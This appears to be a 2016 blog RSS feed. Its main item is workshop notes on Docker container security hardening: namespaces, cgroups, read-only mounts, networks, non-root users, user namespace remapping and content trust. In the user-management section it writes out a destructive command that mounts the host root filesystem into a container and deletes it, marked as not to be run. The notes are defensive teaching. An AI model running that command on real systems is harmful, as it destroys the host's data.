<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Qiu&#39;s Quibble</title>
    <link>http://blog.idempotent.ca/</link>
    <description>Recent content on Qiu&#39;s Quibble</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Wed, 21 Sep 2016 22:35:56 -0400</lastBuildDate>
    <atom:link href="http://blog.idempotent.ca/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Digital Ocean Published My Article!</title>
      <link>http://blog.idempotent.ca/2016/09/21/digital-ocean-published-my-article/</link>
      <pubDate>Wed, 21 Sep 2016 22:35:56 -0400</pubDate>
      
      <guid>http://blog.idempotent.ca/2016/09/21/digital-ocean-published-my-article/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;www.digitalocean.com&#34;&gt;Digital Ocean&lt;/a&gt; just published my article on &lt;a href=&#34;https://www.digitalocean.com/community/tutorials/how-to-self-host-reviewninja-on-digitalocean-using-docker-and-coreos&#34;&gt;How to setup Review Ninja on a Digital Ocean droplet using docker-machine and CoreOS&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;They have high standard for their articles, e.g., every step has to be crystal clear and assume the audience is blank slate. Their editors are technical. The editor I was assigned to was Brian Hogan who wrote &lt;a href=&#34;https://pragprog.com/book/bhtmux/tmux&#34;&gt;the tmux book&lt;/a&gt; which I have read and loved a few years back. How cool was that! All in all, a good experience and I highly recommend writing for them if you have time.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Docker Security</title>
      <link>http://blog.idempotent.ca/2016/06/19/docker-security/</link>
      <pubDate>Sun, 19 Jun 2016 21:49:51 -0700</pubDate>
      
      <guid>http://blog.idempotent.ca/2016/06/19/docker-security/</guid>
      <description>

&lt;p&gt;&lt;a href=&#34;http://2016.dockercon.com/&#34;&gt;DockerCon 2016&lt;/a&gt; is here and this is the very first day with workshops on various topics. I chose to attend the Docker Security workshop as I&amp;rsquo;m interested in seeing how Docker tackles some security challenges. This blog post is my notes taken from the workshop.&lt;/p&gt;

&lt;p&gt;In order to talk about security, we first have to know how docker works on a higher level to know what to secure. The workshop addresses that question early on. Container security is different from, say, securing a hypervisor, since they work differently. Docker is essentially an abstraction layer on top of &lt;a href=&#34;http://man7.org/linux/man-pages/man7/namespaces.7.html&#34;&gt;namespaces&lt;/a&gt; and &lt;a href=&#34;https://en.wikipedia.org/wiki/Cgroups&#34;&gt;cgroups&lt;/a&gt; so we have to talk about security in those contexts. On a higher level, namespaces govern what a container can see, and cgroups govern what a container can use.&lt;/p&gt;

&lt;h1 id=&#34;docker-internals&#34;&gt;Docker Internals&lt;/h1&gt;

&lt;h2 id=&#34;namespaces&#34;&gt;Namespaces&lt;/h2&gt;

&lt;p&gt;When forking a child process on Linux, you can specify what system resource is shared from the parent process and what is &amp;ldquo;unshared&amp;rdquo;, and the &amp;ldquo;unshared&amp;rdquo; resource becomes the namespace isolation provided by the kernel to the process. Such resources are:
* mount
* UTS
* IPC
* network
* pid
* cgroup
* user
See &lt;code&gt;man unshare&lt;/code&gt; for more detailed description.&lt;/p&gt;

&lt;p&gt;What this means is changes made within a namespace by a process isn&amp;rsquo;t visible to other processes outside of the namespace, which effectively provided process isolation, and made a docker container appears to be like a virtual machine on the surface.&lt;/p&gt;

&lt;p&gt;Namespaces appear as files under &lt;code&gt;/proc/&amp;lt;pid&amp;gt;/ns&lt;/code&gt; folder, e.g.,&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# ls -l /proc/1/ns
total 0
lrwxrwxrwx 1 root root 0 Jun 28 03:56 cgroup -&amp;gt; cgroup:[4026531835]
lrwxrwxrwx 1 root root 0 Jun 28 03:56 ipc -&amp;gt; ipc:[4026532440]
lrwxrwxrwx 1 root root 0 Jun 28 03:56 mnt -&amp;gt; mnt:[4026532438]
lrwxrwxrwx 1 root root 0 Jun 28 03:56 net -&amp;gt; net:[4026532443]
lrwxrwxrwx 1 root root 0 Jun 28 03:56 pid -&amp;gt; pid:[4026532441]
lrwxrwxrwx 1 root root 0 Jun 28 03:56 uts -&amp;gt; uts:[4026532439]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;and if you are within a container, can you find out the container id by querying &lt;code&gt;/proc/1/cgroup&lt;/code&gt; file, which lists the name of the namespaces.&lt;/p&gt;

&lt;h2 id=&#34;cgroups&#34;&gt;Cgroups&lt;/h2&gt;

&lt;p&gt;cgroups, or control groups is a kernel feature that provides resource tracking and limitations for a group of tasks. In docker terms, the docker daemon creates and assigns a cgroup for each running container, and you can set what resource container is able to get, e.g., CPU, memory or pid limits.&lt;/p&gt;

&lt;p&gt;e.g., &lt;code&gt;docker run&lt;/code&gt; takes:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;--cpuset-cpus&lt;/code&gt;: CPUs in which to allow execution&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--cpuset-mems&lt;/code&gt;: MEMs in which to allow execution&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--memory-reservation&lt;/code&gt;: Memory soft limit&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--pids-limit&lt;/code&gt;: Tune container pids limit&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Docker names the cgroup it creates using the container id, so a handy way to find out the container id within the container is to inspect &lt;code&gt;/proc/1/cgroup&lt;/code&gt; file in the container:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@48b83d3621b5:/proc/1# cat cgroup
9:pids:/docker/48b83d3621b5c176b22885e799e73f2cec6e14d821c83b2ecb4fc73324212631
8:cpu,cpuacct:/docker/48b83d3621b5c176b22885e799e73f2cec6e14d821c83b2ecb4fc73324212631
7:net_cls:/docker/48b83d3621b5c176b22885e799e73f2cec6e14d821c83b2ecb4fc73324212631
6:devices:/docker/48b83d3621b5c176b22885e799e73f2cec6e14d821c83b2ecb4fc73324212631
5:memory:/docker/48b83d3621b5c176b22885e799e73f2cec6e14d821c83b2ecb4fc73324212631
4:blkio:/docker/48b83d3621b5c176b22885e799e73f2cec6e14d821c83b2ecb4fc73324212631
3:freezer:/docker/48b83d3621b5c176b22885e799e73f2cec6e14d821c83b2ecb4fc73324212631
2:cpuset:/docker/48b83d3621b5c176b22885e799e73f2cec6e14d821c83b2ecb4fc73324212631
1:name=systemd:/docker/48b83d3621b5c176b22885e799e73f2cec6e14d821c83b2ecb4fc73324212631
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here the container id is &lt;code&gt;48b83...&lt;/code&gt;.&lt;/p&gt;

&lt;h1 id=&#34;docker-security-best-practices&#34;&gt;Docker Security Best Practices&lt;/h1&gt;

&lt;h2 id=&#34;secure-the-containers&#34;&gt;Secure the Containers&lt;/h2&gt;

&lt;h3 id=&#34;use-minimal-base-images&#34;&gt;Use minimal base images&lt;/h3&gt;

&lt;p&gt;In a secured environment, every image you build has to come from a known and trusted source. The minimal the base image, the narrower the attack surface is going to be. &lt;a href=&#34;https://www.alpinelinux.org/&#34;&gt;Alpine Linux&lt;/a&gt; has gain significantly in popularity as it&amp;rsquo;s a very minimal Linux distribution. I personally build almost everything from Alpine when I can. The caveat is it&amp;rsquo;s built using &lt;a href=&#34;https://www.musl-libc.org/&#34;&gt;musl libc&lt;/a&gt; instead of the ubiquitous glibc so your mileage may vary depending on how your code or your dependency rely on specifics of glibc.&lt;/p&gt;

&lt;h3 id=&#34;verify-content&#34;&gt;Verify content&lt;/h3&gt;

&lt;p&gt;In order to build the chain of trust, we want to know where our software dependencies come from when building the image. Different package management systems have ways to verify the authenticity and integrity of the packages you want to install. For example, when using &lt;code&gt;apt-get&lt;/code&gt; to install software from 3rd party source, always obtain it from the official channel and verify the keys.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;RUN apt-key adv \
    --keyserver hkp://keyserver.ubuntu.com:80 \
    --recv-keys ... \
    &amp;amp;&amp;amp; echo deb http://repository.example.com stable non-free \
    | tee /etc/apt/sources.list.d/example.list
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;create-read-only-containers-volumes&#34;&gt;Create read-only containers/volumes&lt;/h3&gt;

&lt;p&gt;By default, &lt;code&gt;docker run ...&lt;/code&gt; creates and runs a container in read-write mode. The process in the container is able to write to the root file system of the container. According to the &lt;a href=&#34;https://en.wikipedia.org/wiki/Principle_of_least_privilege&#34;&gt;security principle of least privilege&lt;/a&gt;, if you don&amp;rsquo;t expect the container process to write to the disk, you should run the container with &lt;code&gt;--read-only&lt;/code&gt; flag.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ docker run -it --rm --read-only alpine sh
/ # touch foo
touch: foo: Read-only file system
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Same applies to moounted volumes. If you volume mount a folder from the host not for persistence (e.g., for configuration), you don&amp;rsquo;t need write permission for the mapped folder. You can use &lt;code&gt;-v host_dir:container_dir:ro&lt;/code&gt; to tell docker to mount the folder in read-only mode:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ docker run -it --rm -v $(pwd):/content:ro alpine sh
/ # cd /content
/content # touch foo
touch: foo: Read-only file system
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;networking&#34;&gt;Networking&lt;/h2&gt;

&lt;h3 id=&#34;use-network-namespaces&#34;&gt;Use network namespaces&lt;/h3&gt;

&lt;p&gt;Containers can be &amp;ldquo;linked&amp;rdquo; by specifying &lt;code&gt;--link&lt;/code&gt; during run. e.g., if your &lt;code&gt;app&lt;/code&gt; container has a link to &lt;code&gt;redis&lt;/code&gt; container, within your app container, you can use &lt;code&gt;redis&lt;/code&gt; as the host name for the redis instance:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;docker run -d --name redis redis:latest
docker run -d --name app --link redis:redis app_image
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;However, this is considered a bad practice with the newer docker versions. Links do not survive a container restart, so if either the &lt;code&gt;redis&lt;/code&gt; or the &lt;code&gt;app&lt;/code&gt; container gets restarted, the linkage is gone and hence it&amp;rsquo;s pretty brittle.&lt;/p&gt;

&lt;p&gt;Since docker 1.9, network is a top-level concept and is now a recommended way of connecting containers.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ docker network create test
704c22d89347f18ca1d369af02af5aa89b25a78b8fa0f243bef0978c7aa4fedf

$ docker network ls
NETWORK ID          NAME                DRIVER
ab205c46f52f        bridge              bridge
9ef569719a04        host                host
29053ecdedda        none                null
4e4f01be3f14        onebody_default     bridge
704c22d89347        test                bridge
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The network &lt;code&gt;test&lt;/code&gt; we just created is not tied to any containers. The network is its own subnet under the docker0:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ docker network inspect test
[
    {
        &amp;quot;Name&amp;quot;: &amp;quot;test&amp;quot;,
		...
        &amp;quot;IPAM&amp;quot;: {
			...
            &amp;quot;Config&amp;quot;: [
                {
                    &amp;quot;Subnet&amp;quot;: &amp;quot;172.19.0.0/16&amp;quot;,
                    &amp;quot;Gateway&amp;quot;: &amp;quot;172.19.0.1/16&amp;quot;
                }
            ]
        },
		...
    }
]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A container can join the network by specifying &lt;code&gt;--network&lt;/code&gt; during runtime:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ docker run -it --net=test --rm --name app1 alpine sh
/ # ifconfig eth0
eth0      Link encap:Ethernet  HWaddr 02:42:AC:13:00:02
          inet addr:172.19.0.2  Bcast:0.0.0.0  Mask:255.255.0.0
          inet6 addr: fe80::42:acff:fe13:2%32744/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:71 errors:0 dropped:0 overruns:0 frame:0
          TX packets:9 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:9084 (8.8 KiB)  TX bytes:738 (738.0 B)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You can see the container is assigned an IP address in the subnet. Let&amp;rsquo;s run another container in the network, and take a look at the network:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ docker network inspect test
[
    {
        ...
        &amp;quot;Containers&amp;quot;: {
            &amp;quot;aac7e82e2b89fc021606541ec46bd11b734bc4fd97296b2f343d622e8ccb6a49&amp;quot;: {
                &amp;quot;Name&amp;quot;: &amp;quot;stupefied_albattani&amp;quot;,
                &amp;quot;EndpointID&amp;quot;: &amp;quot;5213b7177348929fae12273c4ed6df6c5894bcfeef246b3fd6ee81789533153e&amp;quot;,
                &amp;quot;MacAddress&amp;quot;: &amp;quot;02:42:ac:13:00:03&amp;quot;,
                &amp;quot;IPv4Address&amp;quot;: &amp;quot;172.19.0.3/16&amp;quot;,
                &amp;quot;IPv6Address&amp;quot;: &amp;quot;&amp;quot;
            },
            &amp;quot;e2d5d159dc1cbb1f671c01286138704128bbbf6f9c428605155dbe8b7df4de1f&amp;quot;: {
                &amp;quot;Name&amp;quot;: &amp;quot;app1&amp;quot;,
                &amp;quot;EndpointID&amp;quot;: &amp;quot;b8fb80f16e8b9d4ec53707fce4d7e49fc901b82f0d727d280fc859684cce1056&amp;quot;,
                &amp;quot;MacAddress&amp;quot;: &amp;quot;02:42:ac:13:00:02&amp;quot;,
                &amp;quot;IPv4Address&amp;quot;: &amp;quot;172.19.0.2/16&amp;quot;,
                &amp;quot;IPv6Address&amp;quot;: &amp;quot;&amp;quot;
            }
        },
        ...
    }
]

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The name associated with the containers are accessible to other containers in the network:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ docker run -it --rm --net=test alpine sh
/ # ping app1
PING app1 (172.19.0.2): 56 data bytes
64 bytes from 172.19.0.2: seq=0 ttl=64 time=0.378 ms
64 bytes from 172.19.0.2: seq=1 ttl=64 time=0.193 ms
64 bytes from 172.19.0.2: seq=2 ttl=64 time=0.294 ms
64 bytes from 172.19.0.2: seq=3 ttl=64 time=0.200 ms
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;However, if you start a container outside of the &lt;code&gt;test&lt;/code&gt; network, none of the containers are going to be accessible:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ docker run -it --rm --name outsider alpine sh
/ # ping app1
ping: bad address &#39;app1&#39;
/ # ping 172.19.0.2
PING 172.19.0.2 (172.19.0.2): 56 data bytes
^C
--- 172.19.0.2 ping statistics ---
4 packets transmitted, 0 packets received, 100% packet loss
/ #
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;be-cautious-with-net-host&#34;&gt;Be cautious with &lt;code&gt;--net=host&lt;/code&gt;&lt;/h3&gt;

&lt;p&gt;I have to confess that I&amp;rsquo;m guilty of this :) When I have container connectivity issues, I slap on &lt;code&gt;--net=host&lt;/code&gt; on &lt;code&gt;docker run&lt;/code&gt; and everything just worked. This is a bad security practice as called out during the workshop. Because &lt;code&gt;--net=host&lt;/code&gt; puts the container in the same network namespace as the host, the container can see &lt;em&gt;all&lt;/em&gt; traffic on the host:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ docker run -it --net=host alpine sh
/ # ip a
1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu 65536 qdisc noqueue state UNKNOWN qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: wlp1s0: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc mq state UP qlen 1000
    link/ether c8:ff:28:62:80:29 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.132/24 brd 192.168.1.255 scope global dynamic wlp1s0
       valid_lft 78812sec preferred_lft 78812sec
    inet 192.168.1.125/24 brd 192.168.1.255 scope global secondary wlp1s0
       valid_lft forever preferred_lft forever
    inet6 fe80::2475:8b1:aafd:3dde/64 scope link
       valid_lft forever preferred_lft forever
4: docker0: &amp;lt;NO-CARRIER,BROADCAST,MULTICAST,UP&amp;gt; mtu 1500 qdisc noqueue state DOWN
    link/ether 02:42:c8:75:9f:71 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.3/16 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:c8ff:fe75:9f71/64 scope link
       valid_lft forever preferred_lft forever
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As demonstrated above, all interfaces on the host is visible inside the container.&lt;/p&gt;

&lt;h3 id=&#34;be-cautious-with-exposed-ports&#34;&gt;Be cautious with exposed ports&lt;/h3&gt;

&lt;p&gt;When you&amp;rsquo;re connecting containers together with network namespace, you don&amp;rsquo;t need to bind the container port to the host port with the &lt;code&gt;-p&lt;/code&gt; option. Exposed ports may create conflict with port bindings on the host. However, if your container is the entrypoint to your web app, then I can&amp;rsquo;t think of a specific reason &lt;em&gt;not&lt;/em&gt; to use port binding, since otherwise, you will have to setup iptable rules to route traffic from the host interface to container IP.&lt;/p&gt;

&lt;h2 id=&#34;user-management&#34;&gt;User Management&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;root&lt;/code&gt; in the container &lt;em&gt;is&lt;/em&gt; root on the host by default. I discovered &lt;a href=&#34;http://blog.idempotent.ca/2016/05/03/docker...root...root...docker-a.k.a.-the-docker-group-is-a-backdoor/&#34;&gt;this hack&lt;/a&gt; that exploits read/write mount and &lt;code&gt;root&lt;/code&gt; user in the container. Consider this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ docker run --rm alpine whoami
root

$ docker run --rm alpine id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;and you can do more damaging things like:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;docker run -v /:/mnt alpine rm -rf /mnt  # DON&#39;T RUN THIS!
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;run-as-non-privileged-user&#34;&gt;Run as non-privileged user&lt;/h3&gt;

&lt;p&gt;Since Docker 1.7, you can provide &lt;code&gt;-u&lt;/code&gt;|&lt;code&gt;--user&lt;/code&gt; to &lt;code&gt;run&lt;/code&gt; command to run the container as a specific user:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ docker run -u 1000:1000 --rm -v /:/mnt alpine id
uid=1000 gid=1000
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now the cuser in the container doesn&amp;rsquo;t have the root privileges:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ docker run -u 1000:1000 --rm -v /:/mnt alpine rm -rf /mnt/bin/sh
rm: can&#39;t remove &#39;/mnt/bin/sh&#39;: Permission denied
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;use-user-namespace-remapping&#34;&gt;Use user namespace remapping&lt;/h3&gt;

&lt;p&gt;Since Docker 1.10, Docker added &lt;a href=&#34;https://integratedcode.us/2015/10/13/user-namespaces-have-arrived-in-docker/&#34;&gt;support&lt;/a&gt; for user namespace for the docker daemon. With this feature, the container is able to run with the root user inside the container but an unprivileged user on the host.&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s see an example. To activate it, we need to rerun the docker daemon with &lt;code&gt;--userns-remap&lt;/code&gt; option.&lt;/p&gt;

&lt;p&gt;First, stop docker daemon:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;systemctl stop docker.service
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;User namespace uses two config files &lt;code&gt;/etc/subuid&lt;/code&gt; and &lt;code&gt;/etc/subgid&lt;/code&gt;. See full description using &lt;code&gt;man subuid&lt;/code&gt; and &lt;code&gt;man subgid&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Touch these files:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;touch /etc/subuid &amp;amp;&amp;amp; touch /etc/subgid
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Run docker daemon:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ sudo docker daemon --userns-remap=default
[...]
INFO[0001] User namespaces: ID ranges will be mapped to subuid/subgid ranges of: dockremap:dockremap
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As you can see, user namespaces have been activated. Furthermore:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ cat /etc/subuid
dockremap:100000:65536

$ cat /etc/subgid
dockremap:100000:65536
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;What this means is the &lt;code&gt;dockremap&lt;/code&gt; user is allocated a block of 65536 user/group ids. Container started henceforth will be using user &lt;code&gt;root&lt;/code&gt; in the container, but to the host, it&amp;rsquo;s going to be user &lt;code&gt;dockremap&lt;/code&gt;&amp;rsquo;s subordinate users.&lt;/p&gt;

&lt;p&gt;Unfortunately, this feature requires the kernel to be compiled with user namespaces turned on. Most distributions don&amp;rsquo;t ship with this kernel config by default. Moreover, there have been security vulnerabilities related to &lt;a href=&#34;https://lwn.net/Articles/543273/&#34;&gt;user namespaces&lt;/a&gt; which hampers mainstream adoption.&lt;/p&gt;

&lt;p&gt;Another caveat about user namespace is once the daemon is run with &lt;code&gt;--userns-remap&lt;/code&gt;, the images pulled previously pulled by the daemon without the flag are going to be pulled again, since the permissioning on the file system layers are no longer valid. So, if you decide to use user namespace remap in production, do it early on and do not switch back and forth.&lt;/p&gt;

&lt;h2 id=&#34;image-distribution&#34;&gt;Image Distribution&lt;/h2&gt;

&lt;p&gt;The security goals are image provenance and trust. Provenance verifies the publisher of the image whereas trust verifies the integrity of the image.&lt;/p&gt;

&lt;h3 id=&#34;pull-by-digest-as-oppose-to-by-tag&#34;&gt;Pull by digest (as oppose to by tag)&lt;/h3&gt;

&lt;p&gt;Pulling images by tag name is surely convenient, but tags do not guarantee integrity. The same tag may not refer to the same image. This is surely the case when the tag name is &lt;code&gt;latest&lt;/code&gt;, as it always points to the latest image being pushed in the repository. Other named tags are not immutable either, since one can always untag (through &lt;code&gt;docker rmi&lt;/code&gt;) and re-tag and push image to change the image being pointed by the tag.&lt;/p&gt;

&lt;p&gt;Alternatively, pull by digest to ensure integrity and immutability. The repo digest is shown to you when you push an image to a registry:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# running the registry
# docker run -p 5000:5000 -v ~/registry:/var/lib/registry --name=registry registry:2  # only works with registry version 2

# building an image...
# docker build -t localhost:5000/test .

# push the image
$ docker push localhost:5000/test
The push refers to a repository [localhost:5000/test]
6102f0d2ad33: Pushed
latest: digest: sha256:04298820c9063b955614868b5cb2d60be91a3d7c560e0d6c377b0c3add764504 size: 528
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We can subsequently pull the image using the digest:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ docker pull localhost:5000/test@sha256:04298820c9063b955614868b5cb2d60be91a3d7c560e0d6c377b0c3add764504
sha256:04298820c9063b955614868b5cb2d60be91a3d7c560e0d6c377b0c3add764504: Pulling from test
Digest: sha256:04298820c9063b955614868b5cb2d60be91a3d7c560e0d6c377b0c3add764504
Status: Downloaded newer image for localhost:5000/test@sha256:04298820c9063b955614868b5cb2d60be91a3d7c560e0d6c377b0c3add764504
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This works well for registries you do control. However, I haven&amp;rsquo;t found an easy way to find out the repo disgest for images hosted on the official docker hub, unless I&amp;rsquo;m missing something glaringly obvious, this sort of defeats the purpose if the official docker hub doesn&amp;rsquo;t make pulling by digest easy for users.&lt;/p&gt;

&lt;h3 id=&#34;content-trust&#34;&gt;Content Trust&lt;/h3&gt;

&lt;h4 id=&#34;when-pulling&#34;&gt;When pulling&lt;/h4&gt;

&lt;p&gt;Docker 1.10 added content trust, which adds a layer of trust between the docker CLI and engine when pulling and pushing images. To enable it, set &lt;code&gt;DOCKER_CONTENT_TRUST&lt;/code&gt; to 1.&lt;/p&gt;

&lt;p&gt;When &lt;code&gt;DOCKER_CONTENT_TRUST&lt;/code&gt; is not set, what &lt;code&gt;docker pull&lt;/code&gt; does is like the following (diagram provided by the workshop)&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://blog.idempotent.ca/images/docker-pull-wo-ct.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;When content trust is turned on, what happens behind the scene is a notary server is contacted by the docker CLI, which responds with notary data for the CLI to verify, and when everything is checked out, the CLI obtains a repo digest, and asks the docker engine for the image given the repo digest. See the figure below. See the following diagram (provided by the workshop)&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://blog.idempotent.ca/images/docker-pull-w-ct.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h4 id=&#34;when-pushing&#34;&gt;When pushing&lt;/h4&gt;

&lt;p&gt;Same as pulling, you set &lt;code&gt;DOCKER_CONTENT_TRUST&lt;/code&gt; to &lt;code&gt;1&lt;/code&gt; and &lt;code&gt;docker push&lt;/code&gt; as usual. The difference is the metadata of the repo is signed by your key that you register with the notary service.&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s see it in action. First let&amp;rsquo;s pull an official image:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ docker pull alpine
Using default tag: latest
Pull (1 of 1): alpine:latest@sha256:3dcdb92d7432d56604d4545cbd324b14e647b313626d99b889d0626de158f73a
sha256:3dcdb92d7432d56604d4545cbd324b14e647b313626d99b889d0626de158f73a: Pulling from library/alpine
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tag it with my repo:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ docker tag kevinjqiu/alpine-test:trusted
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Push the image to my docker hub account:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ docker push kevinjqiu/alpine-test:trusted
The push refers to a repository [docker.io/kevinjqiu/alpine-test]
4fe15f8d0ae6: Layer already exists
trusted: digest: sha256:3dcdb92d7432d56604d4545cbd324b14e647b313626d99b889d0626de158f73a size: 506
Signing and pushing trust metadata
You are about to create a new root signing key passphrase. This passphrase
will be used to protect the most sensitive key in your signing system. Please
choose a long, complex passphrase and be careful to keep the password and the
key file itself secure and backed up. It is highly recommended that you use a
password manager to generate the passphrase and keep it safe. There will be no
way to recover this key. You can find the key in your config directory.
Enter passphrase for new root key with ID 80375a3:
Repeat passphrase for new root key with ID 80375a3:
Enter passphrase for new repository key with ID bb34875 (docker.io/kevinjqiu/alpine-test):
Repeat passphrase for new repository key with ID bb34875 (docker.io/kevinjqiu/alpine-test):
Finished initializing &amp;quot;docker.io/kevinjqiu/alpine-test&amp;quot;
Successfully signed &amp;quot;docker.io/kevinjqiu/alpine-test&amp;quot;:trusted
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As this is the first time I&amp;rsquo;m pushing an image with &lt;code&gt;CONTENT_TRUST&lt;/code&gt; set, it prompts me for a passphrase to sign a generated root key, and then a passphrase to sign the key used with the repo I&amp;rsquo;m pushing to (in this case, &lt;code&gt;kevinjqiu/alpine-test&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;The generated keys will be stored under &lt;code&gt;$HOME/.docker/trust/private/root_keys&lt;/code&gt; and &lt;code&gt;$HOME/.docker/trust/tuf_keys/&lt;/code&gt; folders.&lt;/p&gt;

&lt;h3 id=&#34;docker-security-scanning&#34;&gt;Docker Security Scanning&lt;/h3&gt;

&lt;p&gt;Docker security scanning (Nautilus) is a service provided by Docker Inc that routinely scan your file system layers for known security vulnerabilities (from &lt;a href=&#34;https://cve.mitre.org/&#34;&gt;CVE&lt;/a&gt; database). It also performs binary scan on statically linked binaries.&lt;/p&gt;

&lt;p&gt;It&amp;rsquo;s worth noting that it&amp;rsquo;s not the only solution out there. There are a few other &lt;a href=&#34;https://www.aquasec.com/&#34;&gt;vendors&lt;/a&gt; at DockerCon that provide container security.&lt;/p&gt;

&lt;h2 id=&#34;capabilities-seccomp-and-linux-security-modules&#34;&gt;Capabilities, seccomp and Linux Security Modules&lt;/h2&gt;

&lt;p&gt;Now we&amp;rsquo;re in the more hardcore territory of Linux security and is frankly beyond my understanding of Linux. However, the advice given by the workshop is an easy one: use the default, and do not give more privilege than that&amp;rsquo;s required.&lt;/p&gt;

&lt;h3 id=&#34;do-not-run-container-with-privileged&#34;&gt;Do not run container with &amp;ndash;privileged&amp;hellip;&lt;/h3&gt;

&lt;p&gt;Root user on the container by default doesn&amp;rsquo;t get all the capabilities granted by the kernel. See &lt;code&gt;man capabilities&lt;/code&gt; for a list of capabilities. By default, docker container&amp;rsquo;s root user gets about a dozen capabilities. You can add or remove capabilities during runtime by specifying &lt;code&gt;--cap-add&lt;/code&gt; or &lt;code&gt;--cap-drop&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;It&amp;rsquo;s worth pointing out that capabilities only apply to root users. If a container is run with &lt;code&gt;--user&lt;/code&gt;, then &lt;code&gt;--cap-add&lt;/code&gt; or &lt;code&gt;--cap-drop&lt;/code&gt; don&amp;rsquo;t apply, since non-root users don&amp;rsquo;t have capabilities.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;--privileged&lt;/code&gt; gives a root user all capabilities, so unless you know what you&amp;rsquo;re doing, don&amp;rsquo;t do it. For docker development, it&amp;rsquo;s recommended that you run the development container in privileged mode, but in general, there&amp;rsquo;s never a reason to run with &lt;code&gt;--privileged&lt;/code&gt; on production, since it gives &lt;em&gt;ALL&lt;/em&gt; privileges.&lt;/p&gt;

&lt;h1 id=&#34;references&#34;&gt;References&lt;/h1&gt;

